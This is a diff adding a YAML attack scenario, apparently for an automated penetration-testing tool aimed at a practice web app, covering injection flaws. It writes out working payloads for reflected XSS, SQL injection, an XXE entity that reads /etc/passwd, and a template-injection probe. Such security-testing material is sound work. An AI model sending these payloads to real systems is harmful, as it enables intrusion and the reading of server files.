@@ -1,0 +1,46 @@
+id: ginjuice-a03-injection
+name: "A03 - Injection"
+mode: predator
+retry_on_failure: true
+
+steps:
+  - phase: exploitation
+    description: "Reflected XSS on login page"
+    action:
+      method: GET
+      path: "/login?search=<script>alert(1)</script>"
+    validate:
+      status_code: 200
+      body_contains: "<script>alert(1)</script>"
+
+  - phase: exploitation
+    description: "SQL Injection on product catalog"
+    action:
+      method: GET
+      path: "/catalog?category=' OR '1'='1"
+    validate:
+      status_code: 200
+      body_contains: "Products"
+
+  - phase: exploitation
+    description: "XXE injection on stock endpoint"
+    action:
+      method: POST
+      path: "/catalog/product/stock"
+      headers:
+        Content-Type: "application/xml"
+      payload: |
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <stockCheck><productId>&xxe;</productId></stockCheck>
+    validate:
+      status_code: 500
+
+  - phase: exploitation
+    description: "Server-side template injection on catalog"
+    action:
+      method: GET
+      path: "/catalog?category={{7*7}}"
+    validate:
+      status_code: 200
+      body_contains: "49"
